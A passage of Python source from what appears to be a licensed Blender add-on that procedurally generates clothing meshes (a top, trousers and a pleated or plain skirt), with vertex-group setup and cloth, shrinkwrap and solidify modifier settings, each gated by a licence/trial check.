            bpy.context.object.modifiers["Subdivision"].levels = 2
            bpy.context.object.modifiers["Subdivision"].show_on_cage = True
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.character_object
            bpy.context.object.modifiers["Shrinkwrap"].vertex_group = "Shrinkwrap"
            bpy.context.object.modifiers["Shrinkwrap"].wrap_mode = 'OUTSIDE_SURFACE'
            if(bpy.context.scene.armature_object is not None):
                bpy.context.object.modifiers["Shrinkwrap"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0] * bpy.context.scene.armature_object.scale[0])
            else:
                bpy.context.object.modifiers["Shrinkwrap"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0])
            bpy.ops.object.modifier_add(type='SMOOTH')
            bpy.context.object.modifiers["Smooth"].vertex_group = "Smooth"
            bpy.context.object.modifiers["Smooth"].iterations = 10
            bpy.context.object.modifiers["Smooth"].show_in_editmode = True
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.context.object.modifiers["Shrinkwrap.001"].target = bpy.context.scene.character_object
            bpy.context.object.modifiers["Shrinkwrap.001"].vertex_group = "Shrinkwrap"
            bpy.context.object.modifiers["Shrinkwrap.001"].wrap_mode = 'OUTSIDE_SURFACE'
            if(bpy.context.scene.armature_object is not None):
                bpy.context.object.modifiers["Shrinkwrap.001"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0] * bpy.context.scene.armature_object.scale[0])
            else:
                bpy.context.object.modifiers["Shrinkwrap.001"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0])
            bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
            bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.character_object
            #bpy.context.object.modifiers["SurfaceDeform"].vertex_group = "Pinning"
            bpy.ops.object.modifier_add(type='CLOTH')
            bpy.context.object.modifiers["Cloth"].collision_settings.collision_quality = 5
            bpy.context.object.modifiers["Cloth"].collision_settings.distance_min = 0.001
            bpy.context.object.modifiers["Cloth"].settings.quality = 10
            bpy.context.object.modifiers["Cloth"].collision_settings.use_self_collision = True
            bpy.context.object.modifiers["Cloth"].collision_settings.self_distance_min = 0.001
            bpy.context.object.modifiers["Cloth"].settings.bending_stiffness = 3
            bpy.context.object.modifiers["Cloth"].settings.shrink_min = -0.3
            bpy.context.object.modifiers["Cloth"].settings.shrink_max = 0.3
            bpy.context.object.modifiers["Cloth"].settings.mass = 0.1
            bpy.context.object.modifiers["Cloth"].settings.tension_stiffness = 10
            bpy.context.object.modifiers["Cloth"].settings.compression_stiffness = 10
            bpy.context.object.modifiers["Cloth"].settings.shear_stiffness = 10
            bpy.context.object.modifiers["Cloth"].settings.tension_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.compression_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.shear_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.use_pressure = True
            bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force = 500
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_pressure = "Pressure"
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_mass = "Pinning"
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_shrink = "Shrinking"
            bpy.context.object.modifiers["Cloth"].collision_settings.self_friction = 2
            bpy.context.object.modifiers["Cloth"].settings.pin_stiffness = 0.1
            bpy.ops.object.modifier_add(type='SUBSURF')
            bpy.context.object.modifiers["Subdivision.001"].show_viewport = False
            bpy.ops.object.modifier_add(type='EDGE_SPLIT')
            bpy.context.object.modifiers["EdgeSplit"].use_edge_angle = False
            #if bpy.app.version >= (4,1,0):
            #    bpy.ops.object.modifier_add_node_group(asset_library_type='ESSENTIALS', asset_library_identifier="", relative_asset_identifier="geometry_nodes\\smooth_by_angle.blend\\NodeTree\\Smooth by Angle")
            #    bpy.context.object.modifiers["Smooth by Angle"]["Socket_1"] = True
            bpy.ops.object.modifier_add(type='SOLIDIFY')
            bpy.context.object.modifiers["Solidify"].offset = -1
            bpy.context.object.modifiers["Solidify"].thickness = 0.0025
            bpy.context.object.modifiers["Solidify"].show_on_cage = True
            if bpy.app.version >= (4,1,0):
                bpy.ops.object.modifier_add_node_group(asset_library_type='ESSENTIALS', asset_library_identifier="", relative_asset_identifier="geometry_nodes\\smooth_by_angle.blend\\NodeTree\\Smooth by Angle")
                bpy.context.object.modifiers["Smooth by Angle"]["Socket_1"] = True
                bpy.context.object.modifiers["Smooth by Angle"]["Input_1"] = 6.28319
            bpy.ops.preferences.addon_enable(module="space_view3d_modifier_tools")
            bpy.ops.wm.toggle_all_show_expanded()
            bpy.ops.object.shade_smooth()
            bpy.context.scene.frame_current = 1
            bpy.ops.constraint.delete(constraint="Limit Location", owner='OBJECT')
            bpy.ops.constraint.delete(constraint="Limit Rotation", owner='OBJECT')
            
            bpy.ops.object.hide_view_clear()
            bpy.ops.object.select_all(action='DESELECT')
            bpy.ops.screen.animation_play()
            
            bpy.context.preferences.view.language = safelanguage
            bpy.context.space_data.shading.color_type = 'MATERIAL'
            bpy.ops.ed.undo_push(message="Generate Divine Top")
            bpy.ops.object.play_sound(sound_name="NewCloth.mp3")
            return{'FINISHED'}
    
    

class OBJECT_OT_generate_trousers(bpy.types.Operator):
    bl_idname = "object.generate_trousers"
    bl_label = "Generate Trousers"

    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = get_blender_module_recent(bpymostrecent)
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            #Join all Circle Objects
            bpy.ops.preferences.addon_enable(module="mesh_looptools")
            #bpy.ops.preferences.addon_disable(module=get_blender_module_recent(bpymostrecent))
            bpy.context.view_layer.objects.active = bpy.context.scene.character_object
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.select_all(action='DESELECT')
            CircleObjects = ["AnkleCircle","KneeCircle", "ThighCircle", "GroinPoint","WaistCircle"]
            for name in range(len(CircleObjects)):
                select_object(CircleObjects[name], active=True, deselect=False, cursor_snap=True, center_cursor=False)
                join_objects(bpy.data.objects.get(CircleObjects[name]), bpy.data.objects.get(CircleObjects[name-1]))
            bpy.ops.object.transform_apply(location=True, rotation=True, scale=True)
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.active_object.name = 'Divine_Trousers'
            trousers = bpy.context.active_object
            bpy.context.scene.cloth_object = bpy.context.active_object
            

            me = bpy.context.active_object
            length = edge_length(3,4)
            shift = axis_distance(select_vertices([4], deselect=True, get_location=True), select_vertices([3], deselect=True, get_location=True), axis='X')
            select_vertices([2,4], deselect=True, get_location=True)
            move((shift, 0, 0))

            placement1 = select_vertices([1,5], deselect=True, get_location=True)
            placement2 = select_vertices([0], deselect=True, get_location=True)
            placement3 = mathutils.Vector((0, placement1[1], placement2[2]))
            placement4 = mathutils.Vector((0, placement1[1], placement2[1]))
            heightshift = axis_distance(select_vertices([0], deselect=True, get_location=True), select_vertices([2], deselect=True, get_location=True), axis='Z')
            set_vertex_location_by_index(me, 3, placement3)



            select_vertices([0], deselect=True, get_location=True)
            move((0,0,-length))
            move((0,0,-(length + heightshift/2)))

            select_vertices([2,3,4], deselect=True, get_location=True)
            move((length*0.125, 0, 0))
            
            bpy.ops.mesh.extrude_region_move()
            select_vertices([41,42,43], deselect=True, get_location=True)
            scale_vertices_around_location(placement2, 0, axis='X')

            select_vertices([4,43], deselect=True)
            move((0,-length*0.5, 0))
            select_vertices([2,41], deselect=True)
            move((0,length*0.5, 0))
            select_vertices([5,1], deselect=True)
            move((length*0.5, 0, 0))
            select_vertices([4,2], deselect=True)
            move((length*0.25, 0, 0))
            
            #select_vertices([26,27,28,29,30,31,32], deselect=True, get_location=True)
            #bpy.ops.mesh.delete(type='VERT')
            
            select_vertices([3,42], deselect=True)
            move((0,0,-length*0.5))
            select_vertices([1,2,3,4,5,6,7,8,4,41,42,43], deselect=True, get_location=True)
            move((0,0,-length*0.5))
            
            #BridgeWaist and Group Waist
            select_vertices([25,33,34,35,36,37,38,39,40], deselect=True)
            group_vertices(name_of_group="WaistLoop", weight=1)
            group_vertices(name_of_group="Unwrap", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            select_vertices([1,2,4,5,6,7,8,41,43], deselect=True, get_location=True)
            select_vertices([25,33,34,35,36,37,38,39,40], deselect=False)
            Loop1 = [1,2,4,5,6,7,8,41,43]
            Loop2 = [25,33,34,35,36,37,38,39,40]
            bridge(Loop1, Loop2)
            
            #Bridge Thigh
            Loop1 = [1,2,3,4,5,6,7,8]
            Loop2 = [9,10,11,12,13,14,15,16]
            bridge(Loop1, Loop2)
            
            #Bridge Shin
            Loop3 = [17,18,19,20,21,22,23,24]
            bridge(Loop2, Loop3)
            
            
            
            #Creasing Side
            select_vertices([23,37], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.mesh.mark_sharp()
            replace_weights(group="Unwrap", weight=1)
            group_vertices(name_of_group="Seams", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            select_vertices([19,42], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.mesh.mark_sharp()
            replace_weights(group="Unwrap", weight=1)
            replace_weights(group="Seams", weight=1)
            
            
            
            #Fixing Normals
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.normals_make_consistent(inside=False)
            
            #Cleaning Waist Seam
            select_vertices([37,58], deselect=True)
            bpy.ops.mesh.mark_sharp(clear=True)

            
            #Cleanup Mirror and 0
            select_vertices([0,26,27,28,29,30,31,32], deselect=True)
            bpy.ops.mesh.delete(type='VERT')
            
            
            #Creating Center Group
            select_vertices([25,34], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            group_vertices(name_of_group="ApplyFormInverse", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            select_vertices([34,24], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            replace_weights(group="ApplyFormInverse", weight=1)
            select_vertex_group("ApplyFormInverse", deselect=True)
            bpy.ops.mesh.select_all(action='INVERT')
            group_vertices(name_of_group="ApplyForm", weight=1)
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['ApplyFormInverse'].index
            bpy.ops.object.vertex_group_remove(all=False, all_unlocked=False)
            bpy.ops.object.mode_set(mode='EDIT')
            
            
            #Saving Weights
            select_vertices([24,25,26,27,28,29,30,31,32], deselect=True)
            bpy.ops.mesh.select_more()
            group_vertices(name_of_group="Shrinkwrap", weight=1)
            group_vertices(name_of_group="Pinning", weight=1)
            group_vertices(name_of_group="Smooth", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Shrinkwrap'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Smooth'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            
            #Sorting Cuff Seams
            select_vertices([16,17,18,19,20,21,22,23], deselect=True)
            bpy.ops.mesh.select_more()
            if(bpy.context.scene.ankle_cuff_toggle_property):
                replace_weights(group="Shrinkwrap", weight=1)
                replace_weights(group="Pinning", weight=1)
                replace_weights(group="Smooth", weight=1)
            select_vertices([16,17,18,19,20,21,22,23], deselect=True)
            group_vertices(name_of_group="AnkleLoop", weight=1)
            group_vertices(name_of_group="Unwrap", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.select_more()
            deselect_vertex_group(group_name="AnkleLoop")
            bpy.ops.mesh.mark_sharp()
            group_vertices(name_of_group="AnkleCuffs", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.mark_sharp()
            replace_weights(group="Unwrap", weight=1)
            replace_weights(group="Seams", weight=1)
            
            #Cleaning Cuff Seam
            select_vertex_group("AnkleLoop", deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.mark_sharp(clear=True)
            select_vertex_group("AnkleCuffs", deselect=True)
            bpy.ops.mesh.mark_sharp()
            select_vertex_group("AnkleLoop", deselect=True)
            bpy.ops.mesh.mark_sharp()
            
            #Adding Waist Seam
            select_vertex_group("WaistLoop", deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.mark_sharp(clear=True)
            deselect_vertex_group(group_name="WaistLoop")
            bpy.ops.mesh.mark_sharp()
            group_vertices(name_of_group="WaistBand", weight=1)
            group_vertices(name_of_group="Unwrap", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            select_vertex_group("WaistLoop", deselect=True)
            select_vertex_group("AnkleLoop", deselect=False)
            ungroup_vertices("Seams")
            ungroup_vertices("Unwrap")
            select_vertex_group("WaistBand", deselect=True)
            replace_weights(group="Unwrap", weight=1)
            
            #Unwrapping
            #Assigning Center
            #select_vertices([25,24], deselect=True)
            #bpy.ops.mesh.hide(unselected=False)
            select_vertex_group("ApplyForm", deselect=False)
            bpy.ops.mesh.select_all(action='INVERT')
            deselect_vertex_group(group_name="WaistLoop")
            select_vertices([18,29], deselect=False)
            replace_weights(group="Unwrap", weight=1)
            bpy.ops.mesh.reveal()
            bpy.ops.mesh.select_all(action='DESELECT')
            
            #Unwrapping
            select_vertex_group("Unwrap", deselect=True)
            bpy.ops.mesh.mark_seam(clear=False)
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.uv.unwrap(method='ANGLE_BASED', margin=0.001)
            bpy.ops.mesh.select_all(action='DESELECT')
            
            
            if(bpy.context.scene.preset_materials_toggle_property):
                bpy.ops.object.mode_set(mode='OBJECT')
                bpy.context.space_data.shading.color_type = 'MATERIAL'
                bpy.context.scene.cloth_object.select_set(True)
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
                bpy.context.scene.cloth_object.data.materials.append(bpy.data.materials.new(name="Divine_Trousers"))
                bpy.context.scene.cloth_object.data.materials.append(bpy.data.materials.new(name="Divine_Trousers_Secondary"))
                bpy.ops.object.mode_set(mode='EDIT')
                select_vertex_group("AnkleLoop", deselect=True)
                select_vertex_group("WaistLoop", deselect=False)
                bpy.ops.mesh.select_more()
                bpy.context.scene.cloth_object.active_material_index = 1
                bpy.ops.object.material_slot_assign()
                bpy.context.scene.cloth_object.active_material_index = 1
                bpy.context.scene.cloth_object.active_material.diffuse_color = (0.800032, 0.523353, 0.184638, 1)
                bpy.context.scene.cloth_object.active_material_index = 0
                bpy.context.scene.cloth_object.active_material.diffuse_color = (0.3, 0.3, 0.3, 1)
            
            
            
            
            
            
            
            
            
            
            '''
            bpy.ops.mesh.extrude_region_move()
            select_vertices([44,45,46,47,48,49,50,51,52], deselect=True, get_location=True)
            move((0,0,length))

            bpy.ops.mesh.extrude_region_move()
            select_vertices([53,54,55,56,57,58,59,60,61], deselect=True, get_location=True)
            move((0,0,length))
            
            
            

            Loop1 = [1,2,3,4,5,6,7,8]
            Loop2 = [9,10,11,12,13,14,15,16]
            bridge(Loop1, Loop2)
            Loop3 = [17,18,19,20,21,22,23,24]
            bridge(Loop2, Loop3)

            #Saving Weights
            select_vertices([0,1,2,3,4,5,6,7,8,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61], deselect=True)
            group_vertices(name_of_group="Shrinkwrap", weight=1)
            group_vertices(name_of_group="Pinning", weight=1)
            group_vertices(name_of_group="Smooth", weight=1)
            
            
            
            select_vertices([25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,0], deselect=True, get_location=True)
            bpy.ops.mesh.delete(type='VERT')
            
            
            
            bpy.context.active_object.vertex_groups["Shrinkwrap"].add([2,24,25,26,34], 0.1, 'REPLACE')
            bpy.context.active_object.vertex_groups["Pinning"].add([1,2,3,24,25,26], 0.1, 'REPLACE')

            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.delete(type='ONLY_FACE')
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.fill_holes(sides=4)

            Sharpen Crease
            select_vertices([4], deselect=True)
            bpy.ops.mesh.shortest_path_pick(edge_mode='SELECT', use_fill=False, index=20)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            '''
            
            
            #Saving Additional Weights
            bpy.ops.mesh.select_all(action='SELECT')
            group_vertices(name_of_group="Shrinking", weight=0.5)
            group_vertices(name_of_group="Pressure", weight=0)
            group_vertices(name_of_group="PinAndShrink", weight=0)
            group_vertices(name_of_group="Smooth", weight=0)
            group_vertices(name_of_group="Pinning", weight=0)
            bpy.context.scene.tool_settings.vertex_group_weight = 1.0

            #Adding Modifiers
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.modifier_add(type='MIRROR')
            bpy.context.object.modifiers["Mirror"].merge_threshold = 0.01
            bpy.ops.object.modifier_add(type='SUBSURF')
            bpy.context.object.modifiers["Subdivision"].levels = 2
            bpy.context.object.modifiers["Subdivision"].show_on_cage = True
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.context.object.modifiers["Shrinkwrap"].vertex_group = "Shrinkwrap"
            #bpy.context.object.modifiers["Shrinkwrap"].wrap_method = 'PROJECT'
            bpy.context.object.modifiers["Shrinkwrap"].wrap_mode = 'OUTSIDE_SURFACE'
            bpy.context.object.modifiers["Shrinkwrap"].use_negative_direction = True
            bpy.context.object.modifiers["Shrinkwrap"].use_positive_direction = True
            if(bpy.context.scene.armature_object is not None):
                bpy.context.object.modifiers["Shrinkwrap"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0] * bpy.context.scene.armature_object.scale[0])
            else:
                bpy.context.object.modifiers["Shrinkwrap"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0])
            bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.character_object
            bpy.ops.object.modifier_add(type='SMOOTH')
            bpy.context.object.modifiers["Smooth"].vertex_group = "Smooth"
            bpy.context.object.modifiers["Smooth"].iterations = 10
            bpy.context.object.modifiers["Smooth"].show_in_editmode = True
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.context.object.modifiers["Shrinkwrap.001"].target = bpy.context.scene.character_object
            bpy.context.object.modifiers["Shrinkwrap.001"].vertex_group = "Shrinkwrap"
            #bpy.context.object.modifiers["Shrinkwrap.001"].wrap_method = 'PROJECT'
            bpy.context.object.modifiers["Shrinkwrap.001"].wrap_mode = 'OUTSIDE_SURFACE'
            bpy.context.object.modifiers["Shrinkwrap.001"].use_negative_direction = True
            bpy.context.object.modifiers["Shrinkwrap.001"].use_positive_direction = True
            if(bpy.context.scene.armature_object is not None):
                bpy.context.object.modifiers["Shrinkwrap.001"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0] * bpy.context.scene.armature_object.scale[0])
            else:
                bpy.context.object.modifiers["Shrinkwrap.001"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0])
            bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
            bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.character_object
            #bpy.context.object.modifiers["SurfaceDeform"].vertex_group = "Pinning"
            bpy.ops.object.modifier_add(type='CLOTH')
            bpy.context.object.modifiers["Cloth"].collision_settings.collision_quality = 5
            bpy.context.object.modifiers["Cloth"].collision_settings.distance_min = 0.001
            bpy.context.object.modifiers["Cloth"].settings.quality = 15
            bpy.context.object.modifiers["Cloth"].collision_settings.use_self_collision = True
            bpy.context.object.modifiers["Cloth"].collision_settings.self_distance_min = 0.0025
            bpy.context.object.modifiers["Cloth"].settings.bending_stiffness = 3
            bpy.context.object.modifiers["Cloth"].settings.shrink_min = -0.3
            bpy.context.object.modifiers["Cloth"].settings.shrink_max = 0.3
            bpy.context.object.modifiers["Cloth"].settings.use_pressure = True
            bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force = 50
            bpy.context.object.modifiers["Cloth"].settings.mass = 0.4
            bpy.context.object.modifiers["Cloth"].settings.tension_stiffness = 3
            bpy.context.object.modifiers["Cloth"].settings.compression_stiffness = 10
            bpy.context.object.modifiers["Cloth"].settings.shear_stiffness = 3
            bpy.context.object.modifiers["Cloth"].settings.tension_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.compression_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.shear_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_pressure = "Pressure"
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_mass = "Pinning"
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_shrink = "Shrinking"
            bpy.context.object.modifiers["Cloth"].collision_settings.self_friction = 2
            bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force = 50
            bpy.context.object.modifiers["Cloth"].settings.pin_stiffness = 0.1
            bpy.ops.object.modifier_add(type='SUBSURF')
            bpy.context.object.modifiers["Subdivision.001"].show_viewport = False
            bpy.ops.object.modifier_add(type='EDGE_SPLIT')
            bpy.context.object.modifiers["EdgeSplit"].use_edge_angle = False
            bpy.ops.object.modifier_add(type='SOLIDIFY')
            bpy.context.object.modifiers["Solidify"].offset = 0
            bpy.context.object.modifiers["Solidify"].thickness = 0.005
            bpy.context.object.modifiers["Solidify"].show_on_cage = True
            if bpy.app.version >= (4,1,0):
                bpy.ops.object.modifier_add_node_group(asset_library_type='ESSENTIALS', asset_library_identifier="", relative_asset_identifier="geometry_nodes\\smooth_by_angle.blend\\NodeTree\\Smooth by Angle")
                bpy.context.object.modifiers["Smooth by Angle"]["Socket_1"] = True
                bpy.context.object.modifiers["Smooth by Angle"]["Input_1"] = 6.28319
            bpy.ops.preferences.addon_enable(module="space_view3d_modifier_tools")
            bpy.ops.wm.toggle_all_show_expanded()
            bpy.context.scene.frame_current = 1
            bpy.ops.object.shade_smooth()
            bpy.ops.object.hide_view_clear()
            bpy.ops.object.select_all(action='DESELECT')
            bpy.ops.screen.animation_play()
            
            bpy.context.preferences.view.language = safelanguage
            bpy.ops.ed.undo_push(message="Divine Trousers")
            poop = random.randint(-1, 1)
            if(poop == 0 and bpy.context.scene.ankle_cuff_toggle_property):
                bpy.ops.object.play_sound(sound_name="fantastictrousers.mp3")
            else:
                bpy.ops.object.play_sound(sound_name="NewCloth.mp3")
            return{'FINISHED'}

class OBJECT_OT_generate_skirt(bpy.types.Operator):
    bl_idname = "object.generate_skirt"
    bl_label = "Generate Skirt"

    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            bpy.ops.preferences.addon_enable(module="mesh_looptools")
            
            bpy.context.view_layer.objects.active = bpy.context.scene.character_object
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.select_all(action='DESELECT')
            CircleObjects = ["WaistCircle","WaistLower"]
            for name in range(len(CircleObjects)):
                select_object(CircleObjects[name], active=True, deselect=False, cursor_snap=True, center_cursor=False)
                join_objects(bpy.data.objects.get(CircleObjects[name]), bpy.data.objects.get(CircleObjects[name-1]))
            bpy.ops.object.transform_apply(location=True, rotation=True, scale=True)
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.active_object.name = 'Divine_Skirt'
            skirt = bpy.context.active_object
            bpy.context.scene.cloth_object = bpy.context.active_object
            
            
            
            #If not Pleated
            if(bpy.context.scene.pleated_toggle_property == False):
                bpy.ops.object.mode_set(mode='EDIT')
                length = edge_length(0,1)
                Loop1 = []
                Loop2 = []
                for pleat in range(bpy.context.scene.pleat_count):
                    Loop1.append(pleat)
                for pleat in range(bpy.context.scene.pleat_count):
                    Loop2.append(bpy.context.scene.pleat_count + pleat)
                select_vertices(Loop1, deselect=True)
                bpy.ops.mesh.extrude_region_move()
                move((0,0,-length))
                bpy.ops.mesh.mark_sharp()
                bpy.ops.transform.edge_crease(value=1, snap=False)
                #select_vertices(Loop2, deselect=False)
                #Loop1 = [0,1,2,3,4,5,6,7,8,9,10,11]
                #Loop2 = [12,13,14,15,16,17,18,19,20,21,22,23]
                Waistband = append_selected_vertices_indices_to_array()
                bpy.ops.mesh.mark_seam(clear=False)
                
                
                bridge(Waistband, Loop2)
                
                select_vertices(Loop1, deselect=True)
                bpy.ops.mesh.select_more()
                Waistband = append_selected_vertices_indices_to_array()
                group_vertices(name_of_group="Shrinkwrap", weight=1)
                group_vertices(name_of_group="Pinning", weight=1)
                group_vertices(name_of_group="Smooth", weight=1)
                
                bpy.ops.object.mode_set(mode='EDIT')
                bpy.ops.mesh.select_all(action='INVERT')
                replace_weights(group="Pinning", weight=0)
                group_vertices(name_of_group="Pressure", weight=0)
                group_vertices(name_of_group="Shrinking", weight=0.5)
                bpy.ops.object.mode_set(mode='EDIT')
                replace_weights(group="Smooth", weight=0)
                replace_weights(group="Shrinkwrap", weight=0)
                group_vertices(name_of_group="PinAndShrink", weight=0)
                bpy.context.scene.tool_settings.vertex_group_weight = 1
                
                bpy.ops.object.mode_set(mode='EDIT')
                bpy.ops.mesh.select_all(action='SELECT')
                bpy.ops.uv.cube_project()
                bpy.ops.mesh.select_all(action='DESELECT')
                
            
            else:
                #If Pleated
                bpy.ops.object.mode_set(mode='EDIT')
                WaistLoop = []
                DropLoop = []
                for pleat in range(bpy.context.scene.pleat_count):
                    WaistLoop.append(pleat)
                for pleat in range(bpy.context.scene.pleat_count):
                    DropLoop.append(bpy.context.scene.pleat_count + pleat)
                    
                print(DropLoop)
                print(WaistLoop)
                #WaistLoop = [0,1,2,3,4,5,6,7,8,9,10,11]
                #DropLoop = [12,13,14,15,16,17,18,19,20,21,22,23]
                #WaistLoop = append_selected_vertices_indices_to_array()
                #DropLoop = append_selected_vertices_indices_to_array()
                length = edge_length(0,1)
                
                select_vertices(WaistLoop, deselect=True)
                bpy.ops.mesh.subdivide()
                bpy.ops.mesh.vertices_smooth(factor=1)
                WaistLoop = append_selected_vertices_indices_to_array()
                bpy.ops.mesh.select_nth()
                bpy.ops.transform.resize(value=(0.9, 0.9, 0.9), orient_type='GLOBAL', orient_matrix=((1, 0, 0), (0, 1, 0), (0, 0, 1)), orient_matrix_type='GLOBAL', mirror=True, use_proportional_edit=False, proportional_edit_falloff='SMOOTH', proportional_size=0.076278, use_proportional_connected=False, use_proportional_projected=False, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='MEDIAN', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False)
                bpy.ops.transform.rotate(value=0.191986, orient_axis='Z', orient_type='LOCAL', orient_matrix=((1, 0, 0), (0, 1, 0), (0, 0, 1)), orient_matrix_type='LOCAL', constraint_axis=(False, False, True), mirror=True, use_proportional_edit=False, proportional_edit_falloff='SMOOTH', proportional_size=0.076278, use_proportional_connected=False, use_proportional_projected=False, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='MEDIAN', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False)
                
                select_vertices(DropLoop, deselect=True)
                bpy.ops.mesh.subdivide()
                bpy.ops.mesh.vertices_smooth(factor=1)
                DropLoop = append_selected_vertices_indices_to_array()
                bpy.ops.mesh.select_nth()
                bpy.ops.transform.resize(value=(0.9, 0.9, 0.9), orient_type='GLOBAL', orient_matrix=((1, 0, 0), (0, 1, 0), (0, 0, 1)), orient_matrix_type='GLOBAL', mirror=True, use_proportional_edit=False, proportional_edit_falloff='SMOOTH', proportional_size=0.076278, use_proportional_connected=False, use_proportional_projected=False, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='MEDIAN', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False)
                bpy.ops.transform.rotate(value=0.191986, orient_axis='Z', orient_type='LOCAL', orient_matrix=((1, 0, 0), (0, 1, 0), (0, 0, 1)), orient_matrix_type='LOCAL', constraint_axis=(False, False, True), mirror=True, use_proportional_edit=False, proportional_edit_falloff='SMOOTH', proportional_size=0.076278, use_proportional_connected=False, use_proportional_projected=False, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='MEDIAN', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False)
                
                bpy.ops.object.mode_set(mode='EDIT')
                bridge(WaistLoop, DropLoop)
                
                bpy.ops.mesh.select_all(action='SELECT')
                bpy.ops.transform.edge_crease(value=1, snap=False)
                select_vertices(WaistLoop, deselect=True)
                bpy.ops.mesh.select_mode(use_extend=False, use_expand=False, type='EDGE')
                bpy.ops.mesh.select_similar(type='EDGE_DIR', threshold=0.1)
                bpy.ops.transform.edge_crease(value=-1, snap=False)
                
                bpy.ops.mesh.select_mode(use_extend=False, use_expand=False, type='VERT')
                llength = edge_length(bpy.context.scene.pleat_count*3-1,0)
                select_vertices(WaistLoop, deselect=True)
                bpy.ops.mesh.remove_doubles(threshold=llength)
                group_vertices(name_of_group="Shrinkwrap", weight=1)
                group_vertices(name_of_group="Pinning", weight=1)
                group_vertices(name_of_group="Smooth", weight=1)
                
                waist = append_selected_vertices_indices_to_array()
                bpy.ops.mesh.extrude_region_move()
                move((0,0,length))
